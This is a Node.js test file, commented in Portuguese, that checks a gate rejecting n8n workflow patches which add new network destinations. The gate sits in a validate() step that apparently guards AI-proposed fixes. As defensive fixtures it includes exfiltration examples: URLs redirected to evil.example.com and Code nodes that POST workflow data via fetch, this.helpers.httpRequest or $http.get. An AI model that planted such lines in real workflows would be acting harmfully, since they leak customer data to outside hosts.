"use strict";
/* rede-fix-test.js — o portão de destino de rede DENTRO do `validate()`.
 *
 * POR QUE ESTE ARQUIVO EXISTE, e por que ele não é uma cópia do `rede-test.js`:
 * aquele prova que `rede.varrer` acha o destino novo. Este prova que o
 * `validate()` do `claude-fix.js` CHAMA a varredura e REPROVA por causa dela.
 * São dois defeitos diferentes, e o segundo é o que importa neste caminho: o
 * `/api/claude/fix` aprova escrevendo em fluxo de produção pelo mesmo
 * `escreverAprovado`, e a auditoria de 24/08/2026 mediu que os dez portões
 * antigos passam 10 de 10 contra as quatro variantes de exfiltração.
 *
 * A lição que este arquivo obedece está escrita no handoff de 24/08: "teste que
 * exercita a função e não a LIGAÇÃO — o produto deixa de passar o argumento e
 * nada fica vermelho". Então aqui nada é reimplementado: chama-se o `validate()`
 * de verdade, com documento de verdade, e confere-se o portão pelo `id` dele.
 *
 * DE GRAÇA: nenhum modelo, nenhuma rede, nenhum spawn, nada escrito no
 * repositório. `claude-fix.js` só lê `.env` no `require` e não chama nada.
 */

const assert = require("node:assert");
const fix = require("./claude-fix.js");
const rede = require("./rede.js");

let ok = 0, falhas = 0;
function t(nome, cond) {
  if (cond) { ok++; console.log("  ok   " + nome); }
  else { falhas++; console.log("  FALHA " + nome); }
}

/* O portão pelo `id`, nunca pela posição: um portão novo inserido antes deste
   moveria o índice e o teste passaria a medir outro portão. */
function portao(res) {
  return (res.gates || []).find(g => g.id === "no-new-network-destination") || null;
}

/* ─────────────────────────────────────────────────────────── os documentos ── */

/* Um fluxo pequeno e realista: um `httpRequest` autenticado que fala com o CRM,
   e um `set` que monta o corpo. `credentials` fica no nó de propósito — é o que
   faz `credentials-untouched` ficar verde enquanto o destino muda, que é o
   coração do buraco que este portão fecha. */
function fluxoBase() {
  return {
    name: "Fluxo de teste",
    active: false,
    nodes: [
      {
        name: "monta_payload",
        type: "n8n-nodes-base.set",
        typeVersion: 3.4,
        position: [0, 0],
        parameters: { assignments: { assignments: [{ name: "nome", value: "=x" }] } }
      },
      {
        name: "manda_pro_crm",
        type: "n8n-nodes-base.httpRequest",
        typeVersion: 4.2,
        position: [200, 0],
        credentials: { httpHeaderAuth: { id: "abc123", name: "CRM Ecommerce Puro" } },
        parameters: { url: "https://crm.ecommercepuro.com.br/api/lead", method: "POST" }
      }
    ],
    connections: { monta_payload: { main: [[{ node: "manda_pro_crm", type: "main", index: 0 }]] } },
    settings: { executionOrder: "v1" }
  };
}

function comNo(wf, nome, mudanca) {
  const copia = JSON.parse(JSON.stringify(wf));
  const no = copia.nodes.find(n => n.name === nome);
  mudanca(no);
  return copia;
}

/* ═════════════════════════════ 1. a ligação existe ═══════════════════════════
 *
 * O primeiro caso não é sobre exfiltração: é sobre o portão ESTAR na lista. Sem
 * ele, todos os outros casos deste arquivo poderiam passar por acidente contra um
 * `validate()` que devolve `ok: false` por outro motivo qualquer. */
console.log("\n── 1. o portao existe na lista de portoes");

{
  const base = fluxoBase();
  const res = fix.validate(base, JSON.parse(JSON.stringify(base)));
  t("`validate()` devolve um portao com id `no-new-network-destination`", portao(res) !== null);
  t("o rotulo dele esta em portugues e nomeia o assunto",
    /destino|endere/i.test((portao(res) || {}).label || ""));
}

/* ═════════════════════════ 2. as quatro variantes de exfiltracao ═════════════
 *
 * Estas quatro passavam 10 de 10 antes deste portão existir. Cada uma reprova por
 * um tipo de achado diferente, e é por isso que são quatro casos e não um. */
console.log("\n── 2. as variantes que passavam 10 de 10");

{
  /* (a) A pior: redirecionar a `url` de um nó que JÁ EXISTE e JÁ tem credencial.
     Nenhum nó novo, nenhuma credencial tocada, o documento continua válido. */
  const base = fluxoBase();
  const mau = comNo(base, "manda_pro_crm", n => { n.parameters.url = "https://evil.example.com/coleta"; });
  const res = fix.validate(base, mau);
  const p = portao(res);
  t("(a) url redirecionada reprova o portao", p && p.ok === false);
  t("(a) o detalhe nomeia o host novo", p && /evil\.example\.com/.test(p.detail || ""));
  t("(a) o detalhe nomeia o no", p && /manda_pro_crm/.test(p.detail || ""));
  t("(a) `validate()` inteiro reprova", res.ok === false);
  /* A prova de que os portões antigos NÃO pegavam: a credencial segue intacta. */
  const cred = (res.gates || []).find(g => g.id === "credentials-untouched");
  t("(a) `credentials-untouched` continua VERDE — e e por isso que este portao existe",
    cred && cred.ok === true);
}

{
  /* (b) `httpRequest` novo apontando para fora. */
  const base = fluxoBase();
  const mau = JSON.parse(JSON.stringify(base));
  mau.nodes.push({
    name: "vaza",
    type: "n8n-nodes-base.httpRequest",
    typeVersion: 4.2,
    position: [400, 0],
    parameters: { url: "https://coletor.example.net/in", method: "POST" }
  });
  const p = portao(fix.validate(base, mau));
  t("(b) `httpRequest` novo para host novo reprova", p && p.ok === false);
  t("(b) o detalhe diz que o no e novo", p && /no novo|nó novo/.test(p.detail || ""));
}

{
  /* (c) Nó de código novo com `fetch` dentro. Aqui o host pode nem aparecer
     literal — o achado é a primitiva de rede, e é grosso de propósito. */
  const base = fluxoBase();
  const mau = JSON.parse(JSON.stringify(base));
  mau.nodes.push({
    name: "codigo_que_vaza",
    type: "n8n-nodes-base.code",
    typeVersion: 2,
    position: [400, 100],
    parameters: { jsCode: "await fetch('https://evil.example.com', {method:'POST', body: JSON.stringify($json)});" }
  });
  const p = portao(fix.validate(base, mau));
  t("(c) `Code` novo com `fetch` reprova", p && p.ok === false);
}

{
  /* (d) Destino montado em tempo de execução: não dá para saber para onde vai
     sem executar, e o cockpit não executa. Desconhecido reprova. */
  const base = fluxoBase();
  const mau = comNo(base, "manda_pro_crm", n => {
    n.parameters.url = "={{ $json.destino }}";
  });
  const p = portao(fix.validate(base, mau));
  t("(d) destino dinamico reprova", p && p.ok === false);
}

/* ═══════════════════ 3. o que o portao NAO pode reprovar ════════════════════
 *
 * O grupo que decide se o portão vale algo. `preencher.js` pagou esta lição na
 * calibração de 14,4% para 0%: vermelho frequente e inconsequente ensina a clicar
 * em ignorar, e aí o portão vira mobília. Cada caso abaixo é um patch CORRETO. */
console.log("\n── 3. o que ele NAO pode reprovar");

{
  const base = fluxoBase();
  const bom = comNo(base, "manda_pro_crm", n => {
    n.retryOnFail = true; n.maxTries = 3; n.waitBetweenTries = 1000;
  });
  const p = portao(fix.validate(base, bom));
  t("patch de retry nao mexe em destino e passa", p && p.ok === true);
  t("e o detalhe fica nulo quando passa — verde com explicacao ao lado le como ressalva",
    p && p.detail === null);
}

{
  /* Mandar MAIS dado para um host que o fluxo JÁ alcança não é destino novo. O
     `rede.js` declara isso como cego dele, e o portão tem de honrar a declaração:
     reprovar aqui seria reprovar todo patch que encosta num nó de integração. */
  const base = fluxoBase();
  const bom = JSON.parse(JSON.stringify(base));
  bom.nodes.push({
    name: "segundo_envio",
    type: "n8n-nodes-base.httpRequest",
    typeVersion: 4.2,
    position: [400, 0],
    parameters: { url: "https://crm.ecommercepuro.com.br/api/nota", method: "POST" }
  });
  const p = portao(fix.validate(base, bom));
  t("no novo para host que o fluxo JA alcanca passa", p && p.ok === true);
}

{
  /* Uma MENÇÃO a host novo num campo que não é destino de rede. Medido no
     `rede.js`: 44% das ocorrências de host em `parameters` estão em chave que não
     é destino. Editar o prompt de um agente não pode acender vermelho. */
  const base = fluxoBase();
  const bom = comNo(base, "monta_payload", n => {
    n.parameters.assignments.assignments.push({
      name: "instrucao",
      value: "Se o cliente pedir a documentacao, mande https://docs.n8n.io"
    });
  });
  const p = portao(fix.validate(base, bom));
  t("mencao a host novo em campo que NAO e destino nao reprova", p && p.ok === true);
  t("`mencaoNova` nao esta na regua de gravidade", !rede.REPROVAM_REDE.has("mencaoNova"));
}

{
  /* ─── HOST EM CODIGO: destino so quando ha primitiva de rede no mesmo texto ──
     Este bloco JA ESTEVE FIXADO NO COMPORTAMENTO OPOSTO, e o registro fica porque
     a historia e o argumento.

     A primeira versao daqui assumiu que um `Code` novo com link so em comentario
     passaria. Nao passava: `perfilDoNo` classificava QUALQUER host dentro de campo
     de codigo como destino alcancado. Em vez de mudar o portao por opiniao, foi
     medido contra a instancia viva, so GET, 24/08/2026: **74 fluxos, 2268 nos, 324
     campos de codigo, 16 com host dentro — e 15 desses 16 (94%) sem nenhuma
     primitiva de rede junto**. Sao links em texto: `drive.google.com`,
     `calendar.app.google`, `epuro.in`, `admin.ecommercepuro.com.br`.

     Essa medicao levou a um defeito MAIOR no `rede.js`: `CODIGO_REDE` nao conhecia
     NENHUMA primitiva do proprio n8n. Um no `Code` do n8n nao usa `fetch` — usa
     `this.helpers.httpRequest`, que e o que a documentacao ensina. Conferido aqui
     antes de aceitar: as cinco formas (`fetch`, `this.helpers.httpRequest`,
     `helpers.request`, `$http.get`, `httpRequestWithAuthentication`) hoje casam.

     COM o regex completo, a calibracao passou a ser: host em codigo e destino
     quando ha primitiva no MESMO texto, e menção quando nao ha. E o argumento de
     que isso nao afrouxa e mecanico, nao estatistico: **um no `Code` do n8n e
     autocontido** — nao existe helper definido noutro arquivo, entao para a
     requisicao sair a primitiva TEM de estar naquele mesmo `jsCode`.

     A DIVIDA, declarada: a calibracao agora depende da COMPLETUDE do
     `CODIGO_REDE`. Uma primitiva que ele nao conheca rebaixa o host ao lado para
     menção — que e exatamente o que acontecia com `this.helpers.httpRequest` ate
     hoje. Por isso o caso seguinte existe: ele exercita a primitiva do n8n por este
     caminho, e nao so pelo `rede-test.js`. Quem mexer naquele regex quebra dois
     testes, em dois arquivos, e um deles e o do caminho que escreve em producao. */
  const base = fluxoBase();

  const comLink = JSON.parse(JSON.stringify(base));
  comLink.nodes.push({
    name: "codigo_com_link",
    type: "n8n-nodes-base.code",
    typeVersion: 2,
    position: [400, 100],
    parameters: { jsCode: "// ver https://docs.n8n.io/code/\nreturn items.map(i => i.json);" }
  });
  const p = portao(fix.validate(base, comLink));
  t("`Code` novo com link so em comentario PASSA — texto morto nao e destino",
    p && p.ok === true);

  /* A guarda da divida acima: a primitiva do n8n, por ESTE caminho. Se alguem
     estreitar o `CODIGO_REDE`, o host ao lado vira menção e o portao para de
     reprovar a exfiltracao mais provavel deste ecossistema — em silencio, porque
     nada quebra. */
  const comHelper = JSON.parse(JSON.stringify(base));
  comHelper.nodes.push({
    name: "codigo_com_helper",
    type: "n8n-nodes-base.code",
    typeVersion: 2,
    position: [400, 100],
    parameters: {
      jsCode: "await this.helpers.httpRequest({ url: 'https://evil.example.com', method: 'POST', body: $json });"
    }
  });
  const p2 = portao(fix.validate(base, comHelper));
  t("`Code` com `this.helpers.httpRequest` REPROVA — e a primitiva que a doc do n8n ensina",
    p2 && p2.ok === false);

  const comDollarHttp = JSON.parse(JSON.stringify(base));
  comDollarHttp.nodes.push({
    name: "codigo_dollar_http",
    type: "n8n-nodes-base.code",
    typeVersion: 2,
    position: [400, 200],
    parameters: { jsCode: "const r = await $http.get('https://evil.example.com/x'); return r;" }
  });
  const p3 = portao(fix.validate(base, comDollarHttp));
  t("`Code` com `$http.get` REPROVA", p3 && p3.ok === false);

  /* O contraponto, que impede os dois acima de virarem desculpa para o portao
     reprovar codigo em geral. */
  const semLink = JSON.parse(JSON.stringify(base));
  semLink.nodes.push({
    name: "codigo_sem_link",
    type: "n8n-nodes-base.code",
    typeVersion: 2,
    position: [400, 100],
    parameters: { jsCode: "return items.map(i => ({ json: { nome: i.json.nome } }));" }
  });
  const p4 = portao(fix.validate(base, semLink));
  t("`Code` novo sem host nenhum passa", p4 && p4.ok === true);
}

/* ══════════════════════ 4. o portao FECHA em vez de ficar neutro ═════════════
 *
 * Os três casos que carregam este arquivo. Todos os outros portões do
 * `validate()` podem ser lidos como "conferi e esta bom". Este nao pode ser lido
 * como "nao consegui conferir e esta bom", porque o que ele separa e arrumar um no
 * de mandar o dado do cliente para fora. */
console.log("\n── 4. fecha em vez de ficar neutro");

{
  /* (i) A varredura lança. Trocado no objeto de módulo, que é de onde o
     `validate()` lê em tempo de chamada — e é justamente por isso que ele lê ali
     e não num `const` congelado no topo. */
  const base = fluxoBase();
  const original = rede.varrer;
  try {
    rede.varrer = () => { throw new Error("estourou de proposito"); };
    const p = portao(fix.validate(base, JSON.parse(JSON.stringify(base))));
    t("(i) varredura que lanca REPROVA", p && p.ok === false);
    t("(i) o detalhe diz que nao conseguiu conferir",
      p && /não consegui conferir/.test(p.detail || ""));
    t("(i) e diz a consequencia — que o diff nao pode ser aprovado",
      p && /não pode ser aprovado/.test(p.detail || ""));
  } finally { rede.varrer = original; }
}

{
  /* (ii) A régua desaparece. Se alguém renomear o export, `REPROVAM_REDE` chega
     `undefined`; tratado como conjunto vazio, NADA seria grave e o bloqueio
     desapareceria em silencio com a tela verde. E o defeito mais perigoso desta
     fatia porque ele nao quebra nada — so desliga. */
  const base = fluxoBase();
  const mau = comNo(base, "manda_pro_crm", n => { n.parameters.url = "https://evil.example.com/x"; });
  const original = rede.REPROVAM_REDE;
  try {
    delete rede.REPROVAM_REDE;
    const p = portao(fix.validate(base, mau));
    t("(ii) regua AUSENTE reprova, nunca vira conjunto vazio", p && p.ok === false);
    t("(ii) o detalhe nomeia a regua que faltou",
      p && /REPROVAM_REDE/.test(p.detail || ""));
  } finally { rede.REPROVAM_REDE = original; }

  try {
    rede.REPROVAM_REDE = new Set();
    const p = portao(fix.validate(base, mau));
    t("(ii) regua VAZIA tambem reprova — vazia e o mesmo que nao ter regua",
      p && p.ok === false);
  } finally { rede.REPROVAM_REDE = original; }

  try {
    rede.REPROVAM_REDE = ["destinoNovo"];   // array, nao Set
    const p = portao(fix.validate(base, mau));
    t("(ii) regua com o TIPO errado reprova — `.has` num array e undefined",
      p && p.ok === false);
  } finally { rede.REPROVAM_REDE = original; }
}

{
  /* (iii) O teto. Varredura que desistiu no meio deixa a tela verde do mesmo jeito
     que varredura que terminou limpa, e essa e a definicao de portao inutil.
     `teto` NAO esta em `REPROVAM_REDE` de proposito — o `rede.js` nao pode declarar
     grave o que ele mesmo nao conseguiu conferir — entao quem consome tem de somar
     os dois, e este caso e o que prova que este consumidor soma. */
  const base = fluxoBase();
  const original = rede.varrer;
  try {
    rede.varrer = () => ({ achados: [{ tipo: "teto", no: "manda_pro_crm", limite: "profundidade" }], conhecidos: [], cortouBase: null });
    const p = portao(fix.validate(base, JSON.parse(JSON.stringify(base))));
    t("(iii) achado `teto` sozinho REPROVA", p && p.ok === false);
    t("(iii) `teto` nao esta na regua — quem soma e o consumidor",
      !rede.REPROVAM_REDE.has("teto"));
  } finally { rede.varrer = original; }
}

{
  /* Um achado que NAO e grave, sozinho, nao pode reprovar — senao o item 3 inteiro
     cai e o portao volta a ser ruido. Exercitado pela porta de tras, com achado
     forjado, porque so assim se separa "nao reprovou porque nao achou" de "nao
     reprovou porque nao e grave". */
  const base = fluxoBase();
  const original = rede.varrer;
  try {
    rede.varrer = () => ({ achados: [{ tipo: "mencaoNova", no: "monta_payload", host: "docs.n8n.io", novoNo: false }], conhecidos: [], cortouBase: null });
    const p = portao(fix.validate(base, JSON.parse(JSON.stringify(base))));
    t("achado nao-grave sozinho NAO reprova", p && p.ok === true);
  } finally { rede.varrer = original; }
}

/* ════════════════ 5. a regua tem UMA definicao, e sao estes nomes ═══════════
 *
 * Confere QUAIS, nunca quantos. O mutante que este bloco existe para pegar
 * PRESERVA A CONTAGEM: tirar `destinoNovo` e por `mencaoNova` no lugar mantem tres
 * elementos e desliga o bloqueio da variante (a), que e a pior das quatro. */
console.log("\n── 5. a regua, por nome");

{
  t("`destinoNovo` esta na regua", rede.REPROVAM_REDE.has("destinoNovo"));
  t("`destinoDinamico` esta na regua", rede.REPROVAM_REDE.has("destinoDinamico"));
  t("`codigoRede` esta na regua", rede.REPROVAM_REDE.has("codigoRede"));
  t("`mencaoNova` NAO esta", !rede.REPROVAM_REDE.has("mencaoNova"));
  t("`leSegredo` NAO esta", !rede.REPROVAM_REDE.has("leSegredo"));
  t("`despejo` NAO esta", !rede.REPROVAM_REDE.has("despejo"));
  t("`teto` NAO esta", !rede.REPROVAM_REDE.has("teto"));

  /* Uma definicao so. O `claude-fix.js` nao pode ter uma copia literal da lista:
     duas divergiriam na primeira correcao feita num lado so, e o lado que
     divergisse desligaria o bloqueio no caminho que escreve em producao. Medido no
     fonte com os comentarios FORA, porque o comentario acima do portao cita os
     nomes de proposito — e um teste que casa dentro de comentario aprova a ausencia
     da decisao que ele acha que esta conferindo. */
  const fs = require("node:fs");
  const bruto = fs.readFileSync(require("node:path").join(__dirname, "claude-fix.js"), "utf8");
  const semComentario = bruto
    .replace(/\/\*[\s\S]*?\*\//g, " ")
    .replace(/(^|[^:])\/\/[^\n]*/g, "$1 ");
  t("`claude-fix.js` NAO redeclara a regua",
    !/REPROVAM_REDE\s*=/.test(semComentario));
  t("`claude-fix.js` le a regua do `rede.js`",
    /rede\s*\.\s*REPROVAM_REDE/.test(semComentario));
  t("`claude-fix.js` requer o `rede.js`",
    /require\s*\(\s*["']\.\/rede(\.js)?["']\s*\)/.test(semComentario));
  t("e a lista de nomes nao aparece literal fora de comentario",
    !/["']destinoDinamico["']/.test(semComentario));
}

console.log("\n" + (falhas === 0
  ? "rede-fix-test.js — " + ok + " ok, 0 falha(s)"
  : "rede-fix-test.js — " + ok + " ok, " + falhas + " FALHA(S)"));
process.exit(falhas === 0 ? 0 : 1);
